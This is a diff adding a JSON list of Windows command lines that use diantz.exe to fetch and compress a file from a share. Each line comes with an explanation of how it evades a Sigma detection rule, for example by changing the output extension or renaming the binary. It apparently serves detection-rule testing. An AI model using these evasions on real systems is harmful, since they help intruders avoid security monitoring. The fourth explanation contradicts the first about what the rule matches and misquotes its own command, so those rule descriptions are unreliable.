@@ -1,0 +1,18 @@
+[
+  {
+    "output": "diantz.exe \\\\127.0.0.1\\share\\file.exe C:\\path\\to\\output.tmp",
+    "explanation": "The original rule triggers only when the command line contains all three elements: 'diantz.exe', a space followed by two backslashes (' \\\\'), and '.cab'. By changing the output file extension from '.cab' to '.tmp' or any other arbitrary extension, the logic condition is broken, allowing the file to be compressed and downloaded without triggering the alert."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\diantz.exe C:\\Windows\\Tasks\\not_diantz.exe && C:\\Windows\\Tasks\\not_diantz.exe \\\\127.0.0.1\\share\\file.exe C:\\path\\to\\output.cab",
+    "explanation": "The rule explicitly checks for the string 'diantz.exe' in the command line. Renaming the binary to an arbitrary name (e.g., 'not_diantz.exe') and executing it breaks the 'diantz.exe' match condition entirely."
+  },
+  {
+    "output": "diantz.exe \\\\127.0.0.1\\share\\payload.exe C:\\Windows\\Tasks\\archive.zip",
+    "explanation": "The Sigma rule specifically looks for the '.cab' extension in the command line. By changing the output file extension to '.zip' (or any other extension, or omitting it), the rule is bypassed because it fails to match all three required strings, while diantz.exe will still execute and compress the file into a CAB structure regardless of the extension provided."
+  },
+  {
+    "output": "diantz.exe \\\\127.0.0.1\\share\\payload.exe C:\\Windows\\Tasks\\archive.cab.txt",
+    "explanation": "The Sigma rule searches for ' .cab' (a space followed by a dot cab). If the output path does not have a space immediately preceding '.cab', such as 'C:\\Windows\\Tasks\\archive.cab', it bypasses the strict ' .cab' string match while still generating the cabinet file."
+  }
+]
